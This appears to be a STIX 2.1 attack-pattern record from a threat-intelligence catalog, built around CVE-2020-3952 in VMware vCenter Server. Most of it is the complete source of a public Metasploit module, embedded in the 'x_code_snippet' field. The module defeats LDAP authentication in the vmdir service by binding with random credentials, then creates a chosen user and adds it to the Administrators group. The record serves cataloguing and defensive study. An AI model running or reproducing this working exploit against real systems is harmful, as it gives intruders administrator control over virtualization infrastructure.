{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da0d5039-51e8-4aac-b9d1-3a0401beabac",
    "created": "2024-08-14T16:22:18.141565Z",
    "modified": "2024-08-14T16:22:18.14157Z",
    "name": "VMware vCenter Server vmdir Authentication Bypass",
    "description": " This module bypasses LDAP authentication in VMware vCenter Server's vmdir service to add an arbitrary administrator user. Version 6.7 prior to the 6.7U3f update is vulnerable, only if upgraded from a previous release line, such as 6.0 or 6.5. Note that it is also possible to provide a bind username and password to authenticate if the target is not vulnerable. It will add an arbitrary administrator user the same way. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass.rb",
            "external_id": "vmware_vcenter_vmdir_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3952"
        },
        {
            "source_name": "reference",
            "url": "https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0006.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/HynekPetrak/HynekPetrak/blob/master/take_over_vcenter_670.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::LDAP\n  include Msf::Exploit::Remote::CheckModule\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Server vmdir Authentication Bypass',\n        'Description' => %q{\n          This module bypasses LDAP authentication in VMware vCenter Server's\n          vmdir service to add an arbitrary administrator user. Version 6.7\n          prior to the 6.7U3f update is vulnerable, only if upgraded from a\n          previous release line, such as 6.0 or 6.5.\n          Note that it is also possible to provide a bind username and password\n          to authenticate if the target is not vulnerable. It will add an\n          arbitrary administrator user the same way.\n        },\n        'Author' => [\n          'Hynek Petrak', # Discovery\n          'JJ Lehmann', # Analysis and PoC\n          'Ofri Ziv', # Analysis and PoC\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-3952'],\n          ['URL', 'https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html'],\n          ['URL', 'https://github.com/HynekPetrak/HynekPetrak/blob/master/take_over_vcenter_670.md']\n        ],\n        'DisclosureDate' => '2020-04-09', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['Add', { 'Description' => 'Add an admin user' }]\n        ],\n        'DefaultAction' => 'Add',\n        'DefaultOptions' => {\n          'SSL' => true,\n          'CheckModule' => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'\n        },\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(636), # SSL/TLS\n      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),\n      OptString.new('NEW_USERNAME', [false, 'Username of admin user to add']),\n      OptString.new('NEW_PASSWORD', [false, 'Password of admin user to add'])\n    ])\n  end\n\n  def new_username\n    datastore['NEW_USERNAME']\n  end\n\n  def new_password\n    datastore['NEW_PASSWORD']\n  end\n\n  def base_dn\n    @base_dn ||= 'dc=vsphere,dc=local'\n  end\n\n  def user_dn\n    \"cn=#{new_username},cn=Users,#{base_dn}\"\n  end\n\n  def group_dn\n    \"cn=Administrators,cn=Builtin,#{base_dn}\"\n  end\n\n  def run\n    unless new_username && new_password\n      print_error('Please set the NEW_USERNAME and NEW_PASSWORD options to proceed')\n      return\n    end\n\n    # NOTE: check is provided by auxiliary/gather/vmware_vcenter_vmdir_ldap\n    checkcode = check\n\n    return unless checkcode == Exploit::CheckCode::Vulnerable\n\n    if (@base_dn = datastore['BASE_DN'])\n      print_status(\"User-specified base DN: #{base_dn}\")\n    else\n      # HACK: We stashed the detected base DN in the CheckCode's reason\n      @base_dn = checkcode.reason\n    end\n\n    ldap_connect do |ldap|\n      print_status(\"Bypassing LDAP auth in vmdir service at #{peer}\")\n      auth_bypass(ldap)\n\n      print_status(\"Adding admin user #{new_username} with password #{new_password}\")\n\n      unless add_admin(ldap)\n        print_error(\"Failed to add admin user #{new_username}\")\n      end\n    end\n  rescue Net::LDAP::Error => e\n    print_error(\"#{e.class}: #{e.message}\")\n  end\n\n  # This will always return false, since the creds are invalid\n  def auth_bypass(ldap)\n    # when datastore['BIND_DN'] has been provided in options,\n    # ldap_connect has already made a bind for us.\n    return if datastore['USERNAME'] && ldap.bind\n\n    ldap.bind(\n      method: :simple,\n      username: Rex::Text.rand_text_alphanumeric(8..42),\n      password: Rex::Text.rand_text_alphanumeric(8..42)\n    )\n  end\n\n  def add_admin(ldap)\n    user_info = {\n      'objectClass' => %w[top person organizationalPerson user],\n      'cn' => new_username,\n      'sn' => 'vsphere.local',\n      'givenName' => new_username,\n      'sAMAccountName' => new_username,\n      'userPrincipalName' => \"#{new_username}@VSPHERE.LOCAL\",\n      'uid' => new_username,\n      'userPassword' => new_password\n    }\n\n    # Add our new user\n    unless ldap.add(dn: user_dn, attributes: user_info)\n      res = ldap.get_operation_result\n\n      case res.code\n      when Net::LDAP::ResultCodeInsufficientAccessRights\n        print_error('Failed to bypass LDAP auth in vmdir service')\n      when Net::LDAP::ResultCodeEntryAlreadyExists\n        print_error(\"User #{new_username} already exists\")\n      when Net::LDAP::ResultCodeConstraintViolation\n        print_error(\"Password #{new_password} does not meet policy requirements\")\n      else\n        print_error(\"#{res.message}: #{res.error_message}\")\n      end\n\n      return false\n    end\n\n    print_good(\"Added user #{new_username}, so auth bypass was successful!\")\n\n    # Add our user to the admin group\n    unless ldap.add_attribute(group_dn, 'member', user_dn)\n      res = ldap.get_operation_result\n\n      if res.code == Net::LDAP::ResultCodeAttributeOrValueExists\n        print_error(\"User #{new_username} is already an admin\")\n      else\n        print_error(\"#{res.message}: #{res.error_message}\")\n      end\n\n      return false\n    end\n\n    print_good(\"Added user #{new_username} to admin group\")\n\n    true\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-09, # Vendor advisory"
}